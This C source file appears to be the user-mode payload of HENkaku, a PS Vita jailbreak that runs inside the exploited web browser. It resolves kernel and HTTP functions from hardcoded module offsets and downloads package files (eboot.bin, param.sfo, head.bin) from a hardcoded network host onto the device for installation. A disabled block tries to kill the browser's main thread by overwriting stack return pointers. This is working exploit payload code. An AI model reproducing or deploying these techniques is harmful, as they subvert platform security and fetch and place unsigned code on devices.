#include <stddef.h>
#include <stdarg.h>

#include <psp2/kernel/modulemgr.h>
#include <psp2/kernel/threadmgr.h>
#include <psp2/kernel/sysmem.h>
#include <psp2/display.h>
#include <psp2/io/fcntl.h>

#include "promoterutil.h"
#include "sysmodule_internal.h"

#include "../../build/version.c"

typedef struct func_map {
	int X, Y;
	unsigned base;

	int (*sceKernelAllocMemBlock)();
	int (*sceKernelGetMemBlockBase)();
	int (*sceKernelGetMemBlockInfoByAddr)();
	int (*sceKernelGetThreadInfo)();
	int (*sceClibPrintf)();
	int (*kill_me)();
	int (*sceSysmoduleLoadModuleInternal)();
	int (*sceDisplaySetFramebuf)();
	int (*sceDisplayGetFramebuf)();
	int (*sceKernelDelayThread)();
	int (*sceKernelExitThread)();
	int (*sceKernelCreateThread)();
	int (*sceKernelStartThread)();
	int (*sceClibVsnprintf)();
	int (*sceClibSnprintf)();
	int (*sceKernelFindMemBlockByAddr)();
	int (*sceKernelFreeMemBlock)();

	int (*sceHttpCreateTemplate)();
	int (*sceHttpCreateConnectionWithURL)();
	int (*sceHttpCreateRequestWithURL)();
	int (*sceHttpSendRequest)();
	int (*sceHttpReadData)();

	int (*sceIoOpen)();
	int (*sceIoWrite)();
	int (*sceIoClose)();
	int (*sceIoMkdir)();

	int (*sceKernelGetModuleList)();
	int (*sceKernelGetModuleInfo)();
} func_map;

#define PKG_URL_PREFIX "http://192.168.140.1:5432/pkg/"

#include "../libc.c"
// #include "memcpy.c"

enum {
	SCREEN_WIDTH = 960,
	SCREEN_HEIGHT = 544,
	LINE_SIZE = 960,
	FRAMEBUFFER_SIZE = 2 * 1024 * 1024,
	FRAMEBUFFER_ALIGNMENT = 256 * 1024
};

// Draw functions
#include "font.c"

static void printTextScreen(const char * text, uint32_t *g_vram, int *X, int *Y)
{
	int c, i, j, l;
	unsigned char *font;
	uint32_t *vram_ptr;
	uint32_t *vram;

	for (c = 0; c < strlen(text); c++) {
		if (*X + 8 > SCREEN_WIDTH) {
			*Y += 8;
			*X = 0;
		}
		if (*Y + 8 > SCREEN_HEIGHT) {
			*Y = 0;
			// psvDebugScreenClear(g_bg_color);
		}
		char ch = text[c];
		if (ch == '\n') {
			*X = 0;
			*Y += 8;
			continue;
		} else if (ch == '\r') {
			*X = 0;
			continue;
		}

		vram = g_vram + (*X) + (*Y) * LINE_SIZE;

		font = &msx[ (int)ch * 8];
		for (i = l = 0; i < 8; i++, l += 8, font++) {
			vram_ptr  = vram;
			for (j = 0; j < 8; j++) {
				if ((*font & (128 >> j))) *vram_ptr = 0xFFFFFFFF;
				else *vram_ptr = 0;
				vram_ptr++;
			}
			vram += LINE_SIZE;
		}
		*X += 8;
	}
}

void psvDebugScreenPrintf(func_map *F, uint32_t *g_vram, int *X, int *Y, const char *format, ...) {
	char buf[512];

	va_list opt;
	va_start(opt, format);
	F->sceClibVsnprintf(buf, sizeof(buf), format, opt);
	printTextScreen(buf, g_vram, X, Y);
	va_end(opt);
}
// end draw functions

#define LOG F->sceClibPrintf

// args: F, dest (in cdram), src (any)
int render_thread(int args, unsigned *argp) {
	int ret;
	func_map *F = argp[0];

	SceDisplayFrameBuf fb = {0};
	fb.size = sizeof(SceDisplayFrameBuf);
	fb.base = argp[1]; // this is SceSharedFb
	fb.pitch = SCREEN_WIDTH;
	fb.width = SCREEN_WIDTH;
	fb.height = SCREEN_HEIGHT;
	fb.pixelformat = SCE_DISPLAY_PIXELFORMAT_A8B8G8R8;	
	while (1) {
		ret = F->sceDisplaySetFramebuf(&fb, 1);
		if (ret < 0)
			LOG("sceDisplaySetFramebuf: 0x%x\n", ret);
		memcpy(fb.base, argp[2], fb.pitch * fb.height * 4);
		// F->sceKernelDelayThread(1);
	}
}

void resolve_functions(unsigned *argp, func_map *F) {
	int ret;

	unsigned SceLibKernel_base = argp[0];
	unsigned SceWebBrowser_base = 0; // TODO: different WebBrowser module on retail?
	unsigned SceDriverUser_base = 0;
	unsigned SceGxm_base = 0;
	unsigned SceLibHttp_base = 0;

	F->sceKernelGetModuleList = SceLibKernel_base + 0x675C;
	F->sceKernelGetModuleInfo = SceLibKernel_base + 0x676C;
	F->sceClibPrintf = SceLibKernel_base + 0x8A5D;

	int module_list[0x100];
	int num_loaded = sizeof(module_list)/sizeof(*module_list);
	ret = F->sceKernelGetModuleList(0xFF, module_list, &num_loaded);
	LOG("sceKernelGetModuleList: 0x%x, %d modules\n", ret, num_loaded);
	for (int i = 0; i < num_loaded; ++i) {
		SceKernelModuleInfo info = {0};
		info.size = sizeof(info);
		F->sceKernelGetModuleInfo(module_list[i], &info);
		char *name = info.module_name;
		unsigned addr = info.segments[0].vaddr;
		if (!strcmp(name, "SceDriverUser"))
			SceDriverUser_base = addr;
		else if (!strcmp(name, "SceWebBrowser"))
			SceWebBrowser_base = addr;
		else if (!strcmp(name, "SceGxm"))
			SceGxm_base = addr;
		else if (!strcmp(name, "SceLibHttp"))
			SceLibHttp_base = addr;
		LOG("Module %s at 0x%x\n", info.module_name, info.segments[0].vaddr);
	}

	F->sceKernelAllocMemBlock = SceLibKernel_base + 0x610C;
	F->sceKernelGetMemBlockBase = SceLibKernel_base + 0x60FC;
	F->sceKernelGetThreadInfo = SceLibKernel_base + 0xA791;
	F->kill_me = SceLibKernel_base + 0x684C;
	F->sceSysmoduleLoadModuleInternal = SceWebBrowser_base + 0xC2AD4;
	F->sceDisplaySetFramebuf = SceDriverUser_base + 0x428D;
	F->sceDisplayGetFramebuf = SceDriverUser_base + 0x42A9;
	F->sceKernelDelayThread = SceDriverUser_base + 0xA98;
	F->sceKernelExitThread = SceLibKernel_base + 0x61FC;
	F->sceKernelCreateThread = SceLibKernel_base + 0xACC9;
	F->sceKernelStartThread = SceLibKernel_base + 0xA789;
	F->sceClibVsnprintf = SceLibKernel_base + 0x8A21;
	F->sceClibSnprintf = SceLibKernel_base + 0x89D9;
	F->sceKernelGetMemBlockInfoByAddr = SceGxm_base + 0x79C;
	F->sceKernelFindMemBlockByAddr = SceLibKernel_base + 0x60DC;
	F->sceKernelFreeMemBlock = SceLibKernel_base + 0x60EC;

	F->sceHttpCreateTemplate = SceLibHttp_base + 0x947B;
	F->sceHttpCreateConnectionWithURL = SceLibHttp_base + 0x950B;
	F->sceHttpCreateRequestWithURL = SceLibHttp_base + 0x95FF;
	F->sceHttpSendRequest = SceLibHttp_base + 0x9935;
	F->sceHttpReadData = SceLibHttp_base + 0x9983;

	F->sceIoOpen = SceLibKernel_base + 0xA4AD;
	F->sceIoWrite = SceLibKernel_base + 0x68DC;
	F->sceIoClose = SceLibKernel_base + 0x6A0C;
	F->sceIoMkdir = SceLibKernel_base + 0xA4F5;
}

#define PRINTF(fmt, ...) do { /* psvDebugScreenPrintf(F, F->base, &F->X, &F->Y, fmt, #__VA_ARGS__);*/ LOG(fmt, #__VA_ARGS__); } while (0);

// Downloads a file from url src to filesystem dst, if dst already exists, it is overwritten
void download_file(func_map *F, const char *src, const char *dst) {
	int ret;
	LOG("enter download file src=%s dst=%s\n", src, dst);
	int tpl = F->sceHttpCreateTemplate("henkaku usermode", 2, 1);
	LOG("create template ok\n");
	LOG("sceHttpCreateTemplate: 0x%x\n", tpl);
	int conn = F->sceHttpCreateConnectionWithURL(tpl, src, 0);
	LOG("sceHttpCreateConnectionWithURL: 0x%x\n", conn);
	int req = F->sceHttpCreateRequestWithURL(conn, 0, src, 0, 0, 0);
	LOG("sceHttpCreateRequestWithURL: 0x%x\n", req);
	ret = F->sceHttpSendRequest(req, NULL, 0);
	LOG("sceHttpSendRequest: 0x%x\n", ret);
	unsigned char buf[4096] = {0};

	int fd = F->sceIoOpen(dst, SCE_O_WRONLY | SCE_O_CREAT | SCE_O_TRUNC, 7);
	LOG("sceIoOpen: 0x%x\n", fd);
	while (1) {
		int read = F->sceHttpReadData(req, buf, sizeof(buf));
		if (read < 0) {
			LOG("sceHttpReadData error! 0x%x\n", read);
			break;
		}
		if (read == 0)
			break;
		LOG(".");
		ret = F->sceIoWrite(fd, buf, read);
		if (ret < 0 || ret != read) {
			LOG("sceIoWrite error! 0x%x\n", ret);
			break;
		}
		LOG("+");
	}
	LOG("\n");
	ret = F->sceIoClose(fd);
	LOG("sceIoClose: 0x%x\n", ret);
}

void install_pkg(func_map *F) {
	int ret;
	char dirname[32];
	char pkg_path[0x100];
	char file_name[0x100];
	// TODO: vitashell should clean up whole data/pk directory on launch
	F->sceClibSnprintf(pkg_path, sizeof(pkg_path), "ux0:data/pkg/%x/", &install_pkg); // this is to get random directory
	LOG("package temp directory: %s\n", pkg_path);
	ret = F->sceIoMkdir("ux0:/data/pkg", 6);
	LOG("make root pkg dir 0x%x\n", ret);
	ret = F->sceIoMkdir(pkg_path, 6);
	LOG("make pkg dir 0x%x\n", ret);
	// /eboot.bin
	F->sceClibSnprintf(file_name, sizeof(file_name), "%s/eboot.bin", pkg_path);
	download_file(F, PKG_URL_PREFIX "/eboot.bin", file_name);
	// /sce_sys/
	F->sceClibSnprintf(file_name, sizeof(file_name), "%s/sce_sys", pkg_path);
	ret = F->sceIoMkdir(file_name, 6);
	LOG("make sce_sys 0x%x\n", ret);
	// /sce_sys/param.sfo
	F->sceClibSnprintf(file_name, sizeof(file_name), "%s/sce_sys/param.sfo", pkg_path);
	download_file(F, PKG_URL_PREFIX "/param.sfo", file_name);
	// /sce_sys/package/
	F->sceClibSnprintf(file_name, sizeof(file_name), "%s/sce_sys/package/", pkg_path);
	ret = F->sceIoMkdir(file_name, 6);
	LOG("make sce_sys/package/ 0x%x\n", ret);
	// /sce_sys/package/head.bin
	F->sceClibSnprintf(file_name, sizeof(file_name), "%s/sce_sys/package/head.bin", pkg_path);
	download_file(F, PKG_URL_PREFIX "/head.bin", file_name);

	// done with downloading, let's install it now


}

void __attribute__ ((section (".text.start"))) user_payload(int args, unsigned *argp) {
	unsigned ret;
	struct func_map FF = {0};
	resolve_functions(argp, &FF);
	struct func_map *F = &FF;

	F->sceKernelDelayThread(1000 * 1000);

	LOG("hello from the browser!\n");


#if 0
	ret = F.sceKernelFindMemBlockByAddr(0x60440000, 0);
	LOG("got memblock 0x%x\n", ret);

	unsigned ScePaf_base = argp[3], ScePaf_data_base = argp[4]; TODO: don't use argp here
	LOG("paf base: 0x%x\n", ScePaf_base);
	int (*ScePafThread_F9FFA0BE)() = ScePaf_base + 0x54981;
	unsigned lock = ScePaf_data_base + 0xe428;
	// try to deadlock the main thread by obtaining a lock and never releasing it
	// for (int i = 0; i < 0x1000; ++i) {
	// 	ret = ScePafThread_F9FFA0BE(lock);
	// 	F.sceKernelDelayThread(1);
	// 	// LOG("ScePafThread_F9FFA0BE: 0x%x\n", ret);
	// }

	F.sceKernelDelayThread(1000);

	SceKernelThreadInfo thread_info = { 0 };
	thread_info.size = sizeof(thread_info);
	F.sceKernelGetThreadInfo(0x40010003, &thread_info);
	LOG("stack: 0x%x size: 0x%x\n", thread_info.stack, thread_info.stackSize);
	for (int j = 0; j < 0x10; ++j) {
		for (unsigned i = thread_info.stackSize - 0x50; i < thread_info.stackSize - 0x40; ++i) {
			unsigned *addr = (char*)thread_info.stack + i;
			*addr = F.sceKernelExitThread;
		}
	}
	// unsigned *addr = (char*)thread_info.stack + 0x3ff30 + 0x4C;
	// // try to kill the main thread by overwriting its return pointer on stack with sceKernelExitThread
	// for (int i = 0; i < 0x10000; ++i) {
	// 	*addr = F.sceKernelExitThread;
	// 	if (i % 0x100 == 0)
	// 		F.sceKernelDelayThread(1);
	// }
	// hopefully by now the thread's dead or otherwise inactive (not always the case)
#endif

	// allocate graphics and start render thread
	int block = F->sceKernelAllocMemBlock("display", SCE_KERNEL_MEMBLOCK_TYPE_USER_RW, FRAMEBUFFER_SIZE, NULL);
	LOG("block: 0x%x\n", block);
	ret = F->sceKernelGetMemBlockBase(block, &F->base);
	LOG("sceKernelGetMemBlockBase: 0x%x base 0x%x\n", ret, F->base);

	int thread = F->sceKernelCreateThread("", render_thread, 64, 0x1000, 0, 0, 0);
	LOG("create thread 0x%x\n", thread);

	unsigned thread_args[] = { &F, 0x60440000, F->base };
	memset(F->base, 0x33, FRAMEBUFFER_SIZE);
	// ret = F->sceKernelStartThread(thread, sizeof(thread_args), thread_args);

	// done with the bullshit now, let's rock
	PRINTF("this is HENkaku version " BUILD_VERSION " built at " BUILD_DATE " by " BUILD_HOST "\n");
	PRINTF("...\n");

	// F->sceKernelDelayThread(1000 * 1000);
	LOG("am still running\n");

	install_pkg(F);

	// ret = F.sceSysmoduleLoadModuleInternal(SCE_SYSMODULE_PROMOTER_UTIL);
	// LOG("sceSysmoduleLoadModuleInternal: 0x%x\n", ret);
	
	F->sceKernelDelayThread(5 * 1000 * 1000);

	while (1) {
		F->kill_me();
		F->sceKernelDelayThread(100 * 1000);
	}
}
